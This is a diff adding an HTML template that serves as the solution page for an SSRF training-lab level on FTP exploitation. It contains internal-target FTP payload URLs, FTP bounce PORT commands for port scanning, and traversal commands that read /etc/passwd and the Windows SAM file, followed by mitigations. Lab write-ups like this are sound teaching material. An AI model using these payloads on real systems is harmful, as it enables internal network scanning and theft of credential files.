@@ -1,0 +1,157 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 18 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 18 Solution: SSRF via FTP Protocol</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities through FTP protocol exploitation, using passive mode connections and data channel manipulation to access internal FTP servers.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand FTP architecture:</strong> Control and data channels, active vs passive mode</li>
+                    <li><strong>Exploit passive mode:</strong> FTP passive mode for internal network scanning</li>
+                    <li><strong>Target internal FTP servers:</strong> Access internal file repositories</li>
+                    <li><strong>Extract sensitive files:</strong> Download configuration files and data</li>
+                </ol>
+
+                <h4>FTP SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic internal FTP access
+FTP Server: ftp://localhost:21
+Path: /sensitive/data.txt
+
+# Anonymous FTP access
+FTP Server: ftp://127.0.0.1:21
+Path: /pub/internal_files/
+
+# Authenticated FTP access
+FTP Server: ftp://admin:password@internal.ftp.local:21
+Path: /admin/config/
+
+# FTP over non-standard ports
+FTP Server: ftp://192.168.1.100:2121
+Path: /backup/database.sql
+
+# FTPS (FTP over SSL) targeting
+FTP Server: ftps://secure.internal.local:990
+Path: /encrypted/secrets.txt</code></pre>
+                    </div>
+                </div>
+
+                <h4>FTP Passive Mode Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># FTP passive mode for port scanning
+# When FTP server responds with PASV command:
+# 227 Entering Passive Mode (192,168,1,100,20,21)
+# This reveals internal IP: 192.168.1.100
+# And data port: 20*256 + 21 = 5141
+
+# Exploiting FTP bounce attacks
+FTP Server: ftp://internal.ftp.local:21
+Commands:
+PORT 192,168,1,50,0,22  # Target internal SSH (192.168.1.50:22)
+LIST                    # Trigger connection to target
+
+# FTP data channel redirection
+PASV                    # Enter passive mode
+PORT 127,0,0,1,0,80     # Redirect to localhost:80
+RETR /etc/passwd        # Attempt file retrieval</code></pre>
+                    </div>
+                </div>
+
+                <h4>FTP Command Exploitation:</h4>
+                <ul>
+                    <li><strong>LIST/NLST:</strong> Directory enumeration</li>
+                    <li><strong>RETR:</strong> File download and content extraction</li>
+                    <li><strong>STOR:</strong> File upload (if write access available)</li>
+                    <li><strong>PORT/PASV:</strong> Data channel manipulation</li>
+                    <li><strong>SYST:</strong> System information disclosure</li>
+                    <li><strong>FEAT:</strong> Feature enumeration</li>
+                </ul>
+
+                <h4>Advanced FTP Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># FTP bounce attack for port scanning
+ftp://target.com:21
+PORT 192,168,1,1,0,22    # Scan SSH on 192.168.1.1:22
+PORT 192,168,1,1,0,80    # Scan HTTP on 192.168.1.1:80
+PORT 192,168,1,1,1,187   # Scan port 443 (1*256+187=443)
+
+# FTP directory traversal
+RETR ../../../etc/passwd
+RETR ..\..\..\..\windows\system32\config\sam
+
+# FTP timing attacks for service detection
+RETR /nonexistent        # Fast response = service exists
+RETR /timeout_test       # Slow response = different service</code></pre>
+                    </div>
+                </div>
+
+                <h4>FTP Server Fingerprinting:</h4>
+                <ul>
+                    <li><strong>Banner grabbing:</strong> Server version and type identification</li>
+                    <li><strong>SYST command:</strong> Operating system detection</li>
+                    <li><strong>FEAT command:</strong> Supported feature enumeration</li>
+                    <li><strong>Error messages:</strong> Path disclosure and system info</li>
+                </ul>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>FTP clients:</strong> ftp, lftp, FileZilla</li>
+                    <li><strong>Network scanners:</strong> nmap with FTP scripts</li>
+                    <li><strong>Custom scripts:</strong> FTP bounce attack tools</li>
+                    <li><strong>Protocol analyzers:</strong> Wireshark for FTP traffic analysis</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Internal FTP server enumeration and access</li>
+                    <li>Sensitive file download and data exfiltration</li>
+                    <li>Internal network port scanning via FTP bounce</li>
+                    <li>Configuration file and backup access</li>
+                    <li>Potential file upload and web shell deployment</li>
+                </ul>
+
+                <h4>Common FTP Vulnerabilities:</h4>
+                <ul>
+                    <li><strong>Anonymous access:</strong> Unrestricted file access</li>
+                    <li><strong>Weak credentials:</strong> Default or guessable passwords</li>
+                    <li><strong>Directory traversal:</strong> Path manipulation attacks</li>
+                    <li><strong>FTP bounce:</strong> Using FTP for port scanning</li>
+                    <li><strong>Cleartext transmission:</strong> Credential interception</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Disable anonymous FTP access</li>
+                    <li>Implement strong authentication mechanisms</li>
+                    <li>Use FTPS or SFTP for encrypted transmission</li>
+                    <li>Restrict FTP access to authorized networks</li>
+                    <li>Disable FTP bounce attacks (PORT command restrictions)</li>
+                    <li>Implement proper file system permissions</li>
+                </ul>
+
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-lightbulb-fill me-2"></i>Legacy Protocol Security</h5>
+                    <p class="mb-0">FTP is a legacy protocol with inherent security weaknesses. Modern alternatives like SFTP or HTTPS file transfer should be preferred for secure file operations.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level18" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level19" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
